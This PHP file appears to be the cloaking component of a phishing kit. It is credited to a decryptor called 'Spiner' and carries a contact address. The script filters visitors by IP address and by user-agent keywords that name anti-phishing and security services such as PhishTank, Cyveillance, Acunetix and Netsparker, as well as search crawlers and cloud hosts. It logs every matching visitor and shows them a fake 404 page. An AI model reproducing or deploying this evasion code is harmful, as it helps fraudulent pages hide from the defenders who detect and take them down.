<?
/*****************************************
** Decryption Provided By Spiner         *
**                                       *
** Contact : yamhisse@gmail.com          *
******************************************/



$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
"66.150.14.18*",
);
foreach($ips as $ip) {
if(preg_match('/'.$ip .'/',$_SERVER['REMOTE_ADDR'])){
header("HTTP/1.0 404 Not Found");
$ip = getenv("REMOTE_ADDR");
$file = fopen("001_bot.txt","a");
fwrite($file," user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
echo"<br>";
die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
}
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
"bot",
"above",
"google",
"softlayer",
"amazonaws",
"cyveillance",
"phishtank",
"dreamhost",
"netpilot",
"calyxinstitute",
"tor-exit",
"apache-httpclient",
"lssrocketcrawler",
"crawler",
"urlredirectresolver",
"jetbrains",
"spam",
"windows 95",
"windows 98",
"acunetix",
"netsparker",
"google",
"007ac9",
"008",
"192.comagent",
"200pleasebot",
"360spider",
"4seohuntbot",
"50.nu",
"a6-indexer",
"admantx",
"amznkassocbot",
"aboundexbot",
"aboutusbot",
"abrave spider",
"accelobot",
"acoonbot",
"addthis.com",
"adsbot-google",
"ahrefsbot",
"alexabot",
"amagit.com",
"analytics",
"antbot",
"apercite",
"aportworm",
"arabot",
"yahoo!"
);
foreach($blocked_words as $word2) {
if (substr_count($dp,strtolower($word2)) >0 or $dp == ""or $dp == " "or $dp == "	") {
header("HTTP/1.0 404 Not Found");
$ip = getenv("REMOTE_ADDR");
$file = fopen("bot-_-.txt","a");
fwrite($file," user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
echo"<br>";
die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
};